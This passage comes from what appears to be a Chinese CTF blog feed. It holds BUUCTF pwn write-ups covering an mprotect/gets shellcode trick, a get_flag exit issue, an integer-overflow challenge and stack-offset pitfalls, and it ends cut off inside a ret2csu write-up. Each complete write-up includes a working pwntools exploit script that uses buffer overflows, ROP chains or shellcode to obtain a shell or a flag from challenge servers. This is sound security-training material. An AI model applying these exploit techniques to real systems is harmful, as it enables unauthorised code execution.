href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/#%E5%85%8B%E5%88%B6NX%E4%BF%9D%E6%8A%A4%E2%80%94%E2%80%94mprotect%E5%87%BD%E6%95%B0">二进制总结：mprotect技巧</a><br><br>同时在上述链接给出的分析里我们可以找到gets函数作为输入<br><br>因此该方法中的漏洞点利用思路为：溢出劫持返回地址–&gt;调用mprotect函数–&gt;调用gets函数将shellcode读入指定内存区段–&gt;最后返回到该内存段<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先使用vmmap查看一下程序有哪些内存段：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E5%85%B6%E4%BB%96%E6%8A%80%E5%B7%A7%E7%B1%BB/mprotect%E6%8A%80%E5%B7%A7/vmmap.png"><br>内存段的选取其实是任意的，只要是数据段即可（其实代码段也行，但害怕把某些重要指令破坏导致程序趋势……），总之最后我选择在0x80ec000处开始写入shellcode<br><br>接下来确定mprotect的地址，从Exports导出表里面可以看到该函数在0x806ec80<br><br>然后找到gets函数位置，可以通过readelf命令行工具寻找，这里就不贴图了，最后找到gets是在0x804f630<br><br>综上，可以写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>elf=ELF(targetELF)<br>startAddr=elf.symbols[<span class="hljs-string">&quot;_start&quot;</span>]<br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26685</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x8048a40&quot;</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">else</span>:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br><br>offset=<span class="hljs-number">56</span><br>mprotectAddr=<span class="hljs-number">0x806ec80</span>  <span class="hljs-comment">#mprotect函数地址</span><br>readShellcodeAddr=<span class="hljs-number">0x804f630</span>  <span class="hljs-comment">#gets函数地址</span><br>shellcodeStart=<span class="hljs-number">0x80ec000</span>      <span class="hljs-comment">#写shellcode的数据段，任意选</span><br>shellcode=asm(shellcraft.sh())<br><br>pop3_ret1=<span class="hljs-number">0x80509a5</span>    <span class="hljs-comment"># 3个pop，1个ret</span><br><br><span class="hljs-comment">#payload1=b&#x27;a&#x27;*offset+p32(mprotectAddr)+p32(pop3_ret1)+p32(shellcodeStart)+p32(0x1000)+p32(7)+p32(readShellcodeAddr)+p32(shellcodeStart)+p32(shellcodeStart)</span><br>payload2=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(readShellcodeAddr)+p32(mprotectAddr)+p32(shellcodeStart)+p32(shellcodeStart)+p32(<span class="hljs-number">0x1000</span>)+p32(<span class="hljs-number">7</span>)<br><br>ioTube=Lauch(REMOTE)<br>ioTube.sendline(payload2)<br>ioTube.sendline(shellcode)<br>ioTube.interactive()<br></code></pre></td></tr></table></figure><p>最后说一下这里的参数布置问题，需要一个比较巧妙的布置方法，payload2中的第一个p32(shellcodeStart)既是readShellcodeAddr，即gets函数的参数，又是mprotect函数调用完后，下一个需要跳转到的地址<br><br>同时，payload1和payload2是等价的，不过payload1采用先用mprotect函数赋权的策略，因此需要一段3个pop1个ret的gadget去把mprotect的参数pop走<br><br>更具体的关于32位程序下参数布置的细节，详见<a href="https://0x4a-210.github.io/2025/07/19/TogetherReview/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%80%BB%E7%BB%93/#32%E4%BD%8D%E7%A8%8B%E5%BA%8F%E7%9A%84%E4%BC%A0%E5%8F%82%E9%97%AE%E9%A2%98">二进制总结：32位程序传参问题</a></p>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>其他技巧类</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>正常exit问题</title>
    <link href="/2025/08/07/Questions/%E6%AD%A3%E5%B8%B8exit%E9%97%AE%E9%A2%98/"/>
    <url>/2025/08/07/Questions/%E6%AD%A3%E5%B8%B8exit%E9%97%AE%E9%A2%98/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，链接在这<a href="https://buuoj.cn/challenges#get_started_3dsctf_2016">BUUCTF原题：get_started_3dsctf_2016</a></p><span id="more"></span><p>这道题主要是记录一个没见过的坑，以及一种新的克制NX保护的方法</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先进入IDA查看反编译结果，如图：<br><br><img src="/../../photos/Questions/Pwn-Q3/IDA-main.png"><br>可以看到main函数调用了gets，会发生溢出<br><br>接下来使用checksec检查程序的保护：<br><br><img src="/../../photos/Questions/Pwn-Q3/checksec.png"><br>可以看到只开启了NX保护，再回头看IDA里面的函数表，发现一个get_flag函数，跟进发现功能为打开flag文件并输出，如图：<br><br><img src="/../../photos/Questions/Pwn-Q3/IDA-get_flag.png"><br>但是要注意这个函数存在参数校验，因此可以分析出漏洞点为：溢出gets函数，布置好两个参数，然后劫持到get_flag</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定get_flag函数的地址，通过readelf工具得到get_flag在0x80489a0，如图：<br><br><img src="/../../photos/Questions/Pwn-Q3/readelf.png"><br>接下来确定偏移量，这里要注意main函数没有遵守正常退栈流程，如图：<br><br><img src="/../../photos/Questions/Pwn-Q3/objdump-main.png"><br>因此从IDA里看到的ebp-0x38来计算偏移是不准确的，需要通过pwndbg的cyclic工具来查看偏移，如下图<br><br><img src="/../../photos/Questions/Pwn-Q3/cyclic1.png"><br><img src="/../../photos/Questions/Pwn-Q3/cyclic2.png"><br>可以看到偏移量是56<br><br>综上可以写出如下的利用脚本：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>LOCAL=<span class="hljs-number">1</span><br>REMOTE=<span class="hljs-number">2</span><br>DEBUG=<span class="hljs-number">3</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26633</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *main+32&quot;</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">else</span>:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br><br>offset=<span class="hljs-number">56</span><br>argc1=<span class="hljs-number">814536271</span><br>argc2=<span class="hljs-number">425138641</span><br>exitAddr=<span class="hljs-number">0x804e6a0</span><br><br>winAddr=<span class="hljs-number">0x80489a0</span><br>winAddrSkipSome=<span class="hljs-number">0x80489b8</span><br><br>payload1=<span class="hljs-string">b&#x27;a&#x27;</span>*offset+p32(winAddr)+p32(exitAddr)+p32(argc1)+p32(argc2)<br><span class="hljs-comment"># payload2=b&#x27;a&#x27;*offset+p32(winAddrSkipSome)+p32(exitAddr)</span><br><span class="hljs-comment"># payload3=b&#x27;a&#x27;*offset+p32(winAddr)+p32(0)+p32(argc1)+p32(argc2)</span><br><span class="hljs-comment"># payload4=b&#x27;a&#x27;*offset+p32(winAddrSkipSome)</span><br><br>ioTube=Lauch(REMOTE)<br>ioTube.sendline(payload1)<br>ioTube.recvuntil(<span class="hljs-string">&quot;Qual a palavrinha magica? &quot;</span>)<br>response=ioTube.recv().decode()<br><span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag在这：&#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br></code></pre></td></tr></table></figure><p>最后，说一下为什么exp中存在4种payload，这也是这道题的一个坑<br><br>因为我一开始是按照payload3写的，但打不通，后来搜索得知需要正常exit才能有回显flag，因此在get_flag的返回地址处填入的exit函数地址<br><br>至于为什么有的题目在返回到后门函数时不需要正常exit，个人认为是后门函数的具体功能不同，本题种后门函数是输出flag，在调用完后会ret，而有的题目的后门函数是调用system(“&#x2F;bin&#x2F;sh”)，拿到shell后就不返回了，因此不需要exit<br><br>但是，还剩最后一个问题：为什么跳过参数校验时无论是否返回exit都无法正常输出flag？（即payload2和payload4）<br><br>这一点还没弄明白…………</p>]]></content>
    
    
    <categories>
      
      <category>疑问和踩过的一些坑</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>BUUCTF-bjdctf_2020_babystack2</title>
    <link href="/2025/08/06/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf-2020-babystack2/"/>
    <url>/2025/08/06/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf-2020-babystack2/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，链接见<a href="https://buuoj.cn/challenges#bjdctf_2020_babystack2">BUUCTF-bjdctf_2020_babystack2</a><br></p><span id="more"></span><p>（记做出来的第一道整数溢出类型题目）</p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先checksec，看到只开启了NX保护，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf_2020_babystack2/checksec.png"><br>进入IDA，看到存在后门函数，调用了system(“&#x2F;bin&#x2F;sh”)<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf_2020_babystack2/IDA-backdoor.png"><br>之后分析main函数，如图：<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf_2020_babystack2/IDA-main.png"><br>可以看到read读取多少字节取决于我们的输入，但是如果大于10会被检测出来<br><br>看似没有溢出点，但是仔细分析程序对于nbytes的处理会发现，类型强转带来了整数溢出类型漏洞<br><br>具体来说，由于比较和10的大小时转换成int类型，而nbytes本身是无符号类型，因此如果输入-1，在校验时会出现-1&lt;10从而避免退出，而输入时由于-1在无符号整数下是一个大数，从而实现溢出<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定偏移量，由于溢出发生在main函数，而main函数的汇编一般都会遵守正常进栈（函数序言）、退栈（leave ret）流程，因此可以直接在IDA里查看偏移，从第一张图可以看到offset&#x3D;0x10+0x8<br><br>之后确定backdoor函数地址，通过objdump的反汇编结果可以看到在0x400726<br><br><img src="/../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/%E6%95%B4%E6%95%B0%E6%BA%A2%E5%87%BA/BUUCTF-bjdctf_2020_babystack2/objdump.png"><br>但保险起见不要劫持到这里，可以选择劫持到0x40072a；具体原因见<a href="https://0x4a-210.github.io/2025/07/19/Questions/%E5%A0%86%E6%A0%88%E5%B9%B3%E8%A1%A1%E9%97%AE%E9%A2%98/">Pwn的坑：堆栈平衡问题</a><br><br>综上，可以写出如下的利用脚本了：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>LOCAL=<span class="hljs-number">0</span><br>REMOTE=<span class="hljs-number">1</span><br>DEBUG=<span class="hljs-number">2</span><br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>offset=<span class="hljs-number">0x18</span><br>winAddr=<span class="hljs-number">0x40072a</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Lauch</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode ==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26493</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x400519&quot;</span>)<br>        <span class="hljs-keyword">return</span> ioTube<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Attack</span>(<span class="hljs-params">io</span>):<br>    io.recvuntil(<span class="hljs-string">&quot;[+]Please input the length of your name:\n&quot;</span>)<br>    io.sendline(<span class="hljs-string">&quot;-1&quot;</span>)<br>    io.recvuntil(<span class="hljs-string">&quot;[+]What&#x27;s u name?\n&quot;</span>)<br>    payload=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p64(winAddr)<br>    io.send(payload)<br>    io.interactive()<br><br>ioTube=Lauch(REMOTE)<br>Attack(ioTube)<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>pwn刷题记录</category>
      
      <category>整数溢出</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>不能只在IDA里看偏移</title>
    <link href="/2025/08/06/Questions/%E4%B8%8D%E8%83%BD%E5%8F%AA%E5%9C%A8IDA%E9%87%8C%E7%9C%8B%E5%81%8F%E7%A7%BB/"/>
    <url>/2025/08/06/Questions/%E4%B8%8D%E8%83%BD%E5%8F%AA%E5%9C%A8IDA%E9%87%8C%E7%9C%8B%E5%81%8F%E7%A7%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，链接见：<a href="https://buuoj.cn/challenges#jarvisoj_tell_me_something">BUUCTF：jarvisoj_tell_me_something</a><br></p><span id="more"></span><p>思路倒是不难，但第一次碰到不能在IDA里直接看返回地址的情况，因此记录一下<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先还是进IDA观察反编译：<br><br><img src="/../../photos/Questions/Pwn-Q2/IDA-main.png"><br>看到read可以读取0x100个字节，远大于v4长度，存在溢出<br><br>之后checksec查看，如图：<br><br><img src="/../../photos/Questions/Pwn-Q2/checksec.png"><br>看到只开启了NX，首先尝试寻找后门函数，点击IDA左侧函数表中每个函数，发现good_game可以输出flag：<br><br><img src="/../../photos/Questions/Pwn-Q2/IDA-good_game.png"><br>至此漏洞点分析清楚了：溢出劫持到good_game函数地址即可</p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先确定good_game地址，有很多方法，objdump、readelf或者直接在IDA里看，最后得到good_game在0x400620<br><br>接下来确定输入区距离返回地址的偏移量，这也是这道题的重点，也是一个容易出错的地方<br><br>从第一张图的IDA反编译结果来看，offset应该&#x3D;0x88+0x8<br><br>但是在pwndbg里使用cyclic方法可以看到偏移&#x3D;0x88<br><br><img src="/../../photos/Questions/Pwn-Q2/cyclic.png"><br>这是为什么？通过仔细观察main函数的反汇编结果，可以发现其并不遵守标准的入栈退栈流程，如图所示：<br><br><img src="/../../photos/Questions/Pwn-Q2/disas.png"><br>图中的main函数在退栈时没有leave指令，换句话说其没有恢复rbp，而在IDA中获取偏移基于“rbp上方紧邻着返回地址”这一理论，因此本题这种情况下不能直接从IDA反编译的结果中获取偏移<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(os=<span class="hljs-string">&quot;linux&quot;</span>,arch=<span class="hljs-string">&quot;x86_64&quot;</span>,log_level=<span class="hljs-string">&quot;debug&quot;</span>)<br>context.terminal=[<span class="hljs-string">&quot;tmux&quot;</span>,<span class="hljs-string">&quot;splitw&quot;</span>,<span class="hljs-string">&quot;-h&quot;</span>]<br>targetELF=<span class="hljs-string">&quot;./pwn&quot;</span><br>offset=<span class="hljs-number">0x88</span><br>winAddr=<span class="hljs-number">0x400620</span><br>retAlignPadding=<span class="hljs-number">0x400469</span><br>LOCAL=<span class="hljs-number">0</span><br>REMOTE=<span class="hljs-number">1</span><br>DEBUG=<span class="hljs-number">2</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Attack</span>(<span class="hljs-params">mode=LOCAL</span>):<br>    <span class="hljs-keyword">if</span> mode==LOCAL:<br>        ioTube=process(targetELF)<br>    <span class="hljs-keyword">elif</span> mode ==REMOTE:<br>        ioTube=remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-number">26680</span>)<br>    <span class="hljs-keyword">elif</span> mode==DEBUG:<br>        ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x400525&quot;</span>)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;Input your message:\n&quot;</span>)<br>    payload=<span class="hljs-string">b&#x27;1&#x27;</span>*offset+p64(retAlignPadding)+p64(winAddr)<br>    ioTube.send(payload)<br>    ioTube.recvuntil(<span class="hljs-string">&quot;I have received your message, Thank you!\n&quot;</span>)<br>    response=ioTube.recv().decode(errors=<span class="hljs-string">&quot;ignore&quot;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">r&quot;flag&#123;&quot;</span> <span class="hljs-keyword">in</span> response:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;flag included in &#123;&#125;\n&quot;</span>.<span class="hljs-built_in">format</span>(response))<br><br>Attack(REMOTE)<br></code></pre></td></tr></table></figure><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>除了本题，还有一道题情况类似，见<a href="https://0x4a-210.github.io/2025/08/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2text/BUUCTF-ciscn-2019-s-3/">BUUCTF题解：ciscn_2019_s_3</a><br><br>从这两题，可以总结出以下结论：<br><br>在确定偏移量之前最好看一下反汇编的结果，对于不遵守标准入栈退栈流程的函数，不能直接从IDA中读出偏移，而是要使用cyclic工具去确定</p>]]></content>
    
    
    <categories>
      
      <category>疑问和踩过的一些坑</category>
      
      <category>Pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>ret2csu-for-BUUCTF-ciscn_2019_s_3</title>
    <link href="/2025/08/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn-2019-s-3/"/>
    <url>/2025/08/05/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn-2019-s-3/</url>
    
    <content type="html"><![CDATA[<h1 id="题目简介"><a href="#题目简介" class="headerlink" title="题目简介"></a>题目简介</h1><p>BUUCTF原题，题目链接在这：<a href="https://buuoj.cn/challenges#ciscn_2019_s_3">BUUCTF原题：ciscn_2019_s_3</a><br></p><span id="more"></span><p>这道题的坑比较多，通过这题学到了很多细节上的东西，于是记录一下<br></p><h1 id="漏洞点分析"><a href="#漏洞点分析" class="headerlink" title="漏洞点分析"></a>漏洞点分析</h1><p>首先拖进IDA观察，main函数就不多说了，直接跟进vuln函数<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/IDA-vuln.png"><br>如图所示，看到read读取0x400字节，因此存在溢出<br><br>之后checksec检查，发现只开了NX<br><br>之后，查看gadget函数的反汇编，发现存在mov rax,3b的指令，如下图所示；而3b恰好是execve系统调用号<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/mov-rax.png"><br>同时，函数表中没有发现任何明显可以泄露地址的函数（puts、write、printf等），所以不能ret2libc<br><br>综上，这道题的漏洞点在于通过溢出劫持执行流到ROP链，执行execve(“&#x2F;bin&#x2F;sh”,0,0)系统调用<br></p><h1 id="漏洞点利用"><a href="#漏洞点利用" class="headerlink" title="漏洞点利用"></a>漏洞点利用</h1><p>首先寻找&#x2F;bin&#x2F;sh字符串的位置，shift+F12发现程序本身没有：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/find-string.png"><br>因此只能想办法将其布置在某个可写位置<br><br>首先想到布置在栈上，但是栈地址未知，需要能够泄露栈地址，这里观察到在vuln函数里存在一个write系统调用会输出0x30个字节，而buf只有16字节，因此该write操作会输出栈上的高地址处内容，有可能泄露栈上某个地址<br><br>具体泄露的是什么地址，需要通过调试确定，这里通过python脚本来确定，在0x400501即vuln函数调用read之前设置断点，并将泄露的地址写入文件保存，和buf地址相减计算偏移：<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">ioTube=gdb.debug(targetELF,<span class="hljs-string">&quot;b *0x400501&quot;</span>)<br>realAddr=LeakAddr(ioTube)<br><span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;addr.txt&quot;</span>,<span class="hljs-string">&quot;w&quot;</span>).write(<span class="hljs-built_in">hex</span>(realAddr))<br></code></pre></td></tr></table></figure><p>具体的操作如下所示：<br><br>首先在调用read之前看到buf地址在0x7fff21e640d0，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/buf-addr.png"><br>之后继续执行程序，看到泄露地址&#x3D;0x7fff21e64218，如下图：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/leak-addr.png"><br>综上，可以得到泄露地址距离buf地址有0x148字节<br><br>第二个问题是如何布置参数，通过ROPgadget工具，可以发现程序本身不存在控制rdx的可用碎片，至此利用思路似乎陷入僵局<br><br>但是，任何一个程序的__libc_csu_init函数里基本都会存在一些可以控制各个寄存器的代码段，如下图所示：<br><br><img src="/../../../../photos/pwn%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/ROP/ret2csu/ret2csu-for-BUUCTF-ciscn_2019_s_3/csu.png"><br>可以看到，在0x40059a地址开始，有一系列设置寄存器的指令，并且最后以ret结尾，而从0x400580地址开始，又存在我们想要的设置rdx等寄存器的指令<br><br>综上，可以先返回到0x40059a，将栈上布置好的值pop给r12~r15等寄存器；之后返回到0x400580地址处，再将需要的值mov给rdx、rsi等寄存器<br><br>这里再说一下payload构造的一些细节：<br><br>第一，r15寄存器没有作用（只能控制edi）所以直接置0即可<br><br>第二，关键的是r12、rbp、rbx寄存器，由于在第二阶段会call [r12+rbx<em>8]<br><br>因此我们可以把rbx置0，r12设置成： <em><strong>想要的返回地址所在的地址</strong></em> 注意，为什么这里r12要是二级指针，因为是call [r12]而不是call r12（做题时在这里卡了很久，没注意到有一次解引用……）<br><br>至于rbp，由于0x400591地址处存在一个比较和循环，所以需要把rbp设置成rbx+1，以便跳出循环，让程序顺利走到最后的ret指令<br><br>最后，在第二阶段，还需要填充一共7</em>8&#x3D;56字节的脏数据，因为从0x400596到0x4005a2的指令会让rsp移动56字节<br><br>因此构造的payload如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs python">csuSetStack=<span class="hljs-number">0x40059a</span>       <span class="hljs-comment"># push rbx ; push rbp; push r12 ; push r13 ; push r14 ; push r15 ; ret</span><br>csuSetRegister=<span class="hljs-number">0x400580</span>    <span class="hljs-comment">#                                 rdx=r13;  